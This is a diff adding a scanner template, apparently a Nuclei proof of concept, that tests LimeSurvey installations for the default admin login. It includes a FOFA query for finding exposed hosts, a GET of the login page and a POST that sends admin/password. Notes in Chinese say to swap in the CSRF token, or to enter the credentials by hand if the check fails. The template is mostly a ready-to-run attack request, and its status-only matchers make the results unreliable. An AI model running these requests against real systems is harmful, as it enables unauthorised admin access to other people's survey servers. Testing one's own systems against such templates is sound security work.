@@ -1,0 +1,43 @@
+id: poc-gcyv7oy1tl6vxaq4
+info:
+  name: LimeSurvey login存在默认口令漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gcyv7oy1tl6vxaq4'
+  tags: default-login,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gcyv7oy1tl6vxaq4
+    fofa: title="LimeSurvey"
+http:
+- raw:
+  - 'GET /index.php/admin/authentication/sa/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.9
+
+    **替换请求数据包中的csrf值**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /index.php/admin/authentication/sa/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.998.27 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    user=admin&password=password&YII_CSRF_TOKEN=&login_submit=login
+
+    **上述POC验证失败，直接输入账密：admin/password**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
